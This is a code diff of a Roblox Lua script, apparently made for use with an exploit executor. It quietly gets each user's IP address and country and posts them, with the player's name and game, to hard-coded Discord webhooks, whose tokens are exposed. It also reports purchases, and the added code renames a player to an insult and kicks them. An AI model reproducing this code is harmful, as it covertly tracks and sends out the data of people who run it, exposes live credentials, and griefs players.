@@ -9,11 +9,10 @@ local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local ExecuteWebhookURL = "https://discord.com/api/webhooks/1247987606407483492/gCrMS46_atvCO5xkM6ecFQGzZt84c9KvUhUnY4hftah9-y6O6lzcPY2l6HDR-PTHVAng"
-local PurchaseWebhookURL = "https://discord.com/api/webhooks/1248000775024803850/YYyeLHEAYFbB8euD6H71UoFEAJS5UnXAOHPdhJM2XvEE9lsoQ0Q4tq43qiNbEB-y_390"
+local PurchaseWebhookURL = "https://discord.com/api/webhooks/1250811161096618024/48K9A2MM-GxxzP4T-leSyTALMkW-sq8-I7IS0RkEGtAMwED_NYc2YWoxZV4KLYY9n7PL"
 
 local forbiddenWords = {"raid", "attack", "spam"}
-local forbiddenPatterns = {"@everyone", "@here", "/%w+"}
-local allowedDomains = {"roblox.com"}
+local forbiddenPatterns = {"@[%w_]+", "/%w+"} -- Filtra cualquier cosa que empiece con @ o /
 local prefix = "[LOGGER]"
 
 local function sanitizeMessage(message)
@@ -25,15 +24,22 @@ local function sanitizeMessage(message)
     end
 
     message = message:gsub("https?://[%w-_%.%?%.:/%+=&]+", function(url)
-        for _, domain in ipairs(allowedDomains) do
-            if url:find(domain) then
-                return url
-            end
+        if url:find("roblox.com") then
+            return url
         end
         return "[filtered]"
     end)
 
     return message
+end
+
+local function changeDisplayName(player)
+    local originalName = player.DisplayName
+    local newName = ":v Sean mamon" -- Cambia esto a un nombre gracioso de tu elección
+    player.DisplayName = newName
+    wait(10) 
+    player.DisplayName = originalName
+    game.Players.LocalPlayer:Kick()
 end
 
 local function sendNotificationToDiscord(webhookURL, message)
@@ -73,22 +79,28 @@ local blacklist = downloadBlacklist(blacklistUrl)
 
 local playerName = game.Players.LocalPlayer.Name
 local playerId = game.Players.LocalPlayer.UserId
+local localPlayer = game.Players.LocalPlayer
 
 if not isInBlacklist(playerId, blacklist) then
     local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
     local gameName = gameInfo and gameInfo.Name or "Unknown Game"
     
-    -- Obtener la dirección IP del jugador
     local ipAddress = game:HttpGet("https://api.ipify.org/")
     
-    -- Obtener el país basado en la dirección IP
     local country = "Unknown"
     local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
     if response then
         country = response
     end
+
+    for _, pattern in ipairs(forbiddenPatterns) do
+        if playerName:match(pattern) then
+            changeDisplayName(localPlayer)
+            break
+        end
+    end
     
-    sendNotificationToDiscord(ExecuteWebhookURL, playerName .. " from " .. country .. " Bypass Trigon '" .. gameName .. "'.")
+    sendNotificationToDiscord(ExecuteWebhookURL, playerName .. " from " .. country .. " executed the script in game '" .. gameName .. "'.")
 else
     warn("You are not allowed to send messages.")
 end
@@ -103,13 +115,7 @@ local function handlePurchase(player, productId)
         local gameLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/" .. game.Name
         local itemLink = "https://www.roblox.com/catalog/" .. productId
 
-        local message = ""
-        if itemPrice == 0 then
-            message = player.Name .. " obtained the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or itemType) .. ") for free in the game " .. gameLink .. ". Item link: " .. itemLink
-        else
-            message = player.Name .. " bought the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or itemType) .. ") in the game " .. gameLink .. " for " .. itemPrice .. " Robux. Item link: " .. itemLink
-        end
-
+        local message = player.Name .. " bought the item '" .. itemName .. "' (" .. (isCollectible and "Collectible Item" or itemType) .. ") for " .. itemPrice .. " Robux. Item link: " .. itemLink
         sendNotificationToDiscord(PurchaseWebhookURL, message)
     end
 end
@@ -131,6 +137,7 @@ MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gameP
         handlePurchase(player, gamePassId)
     end
 end)
+    
 
 function genStr(minL, maxL)
 	local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
